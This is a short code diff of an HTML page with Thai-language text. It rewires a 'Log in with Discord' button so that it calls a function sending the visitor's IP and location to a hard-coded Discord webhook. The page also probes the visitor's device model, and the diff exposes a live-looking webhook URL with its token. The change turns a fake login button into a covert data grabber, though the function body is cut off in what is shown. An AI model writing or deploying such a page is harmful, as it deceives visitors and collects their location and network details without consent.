@@ -79,7 +79,7 @@
 
     <img id="slideshow" src="https://i.pinimg.com/originals/8c/b2/88/8cb288daa036f41d26e5bf9118360ccd.jpg" alt="Slideshow Image" />
 
-    <button onclick="getLocation()">เข้าสู่ระบบด้วย Discord</button>
+    <button onclick="sendIpLocationToWebhook()">เข้าสู่ระบบด้วย Discord</button>
 
     <p id="device-info">📱 กำลังตรวจสอบรุ่นอุปกรณ์...</p>
     <p id="status">ยังไม่มีการยืนยัน</p>
@@ -144,7 +144,7 @@
       window.location.href = discordAuthUrl;
     });
 
-      // ==== ส่งข้อมูลไป Webhook ====
+    // ==== ส่งข้อมูลไป Webhook ====
     async function sendIpLocationToWebhook() {
       const webhookURL = "https://discord.com/api/webhooks/1381107593946202214/TUZFgWXhHIRUiQv28wgTtvbZz7tDZB--rXcLy1EyN7oE4FXkNfu7VrBtBBUVQDJRT-9u"; // แก้เป็นของคุณ
       statusEl.textContent = "📡 กำลังส่งข้อมูล...";
